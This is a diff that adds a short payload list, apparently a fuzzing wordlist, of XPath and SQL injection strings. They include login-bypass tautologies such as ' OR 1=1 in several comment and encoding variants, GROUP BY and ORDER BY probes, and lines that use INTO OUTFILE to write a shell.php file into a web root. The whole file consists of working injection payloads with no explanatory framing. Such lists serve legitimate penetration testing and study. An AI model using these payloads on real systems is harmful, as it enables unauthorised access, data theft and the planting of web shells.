@@ -1,0 +1,19 @@
+//*
+count(/child::node())
+count(//*[position()=1])
+' OR 1=1#
+' OR 1=1--
+' OR 1=1-- 
+' OR 1=1--+-
+' OR 1=1/*
+' OR 1=1 %00
+' OR 1=1 %23
+' OR 1=1 %2D%2D
+' OR 1=1 GROUP BY 1--
+' OR 1=1 HAVING 1=1--
+' OR 1=1 INTO DUMPFILE '/tmp/exploit'--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 1--
+' or 1=1 or ''='
+' OR 1=1 ORDER BY 1--
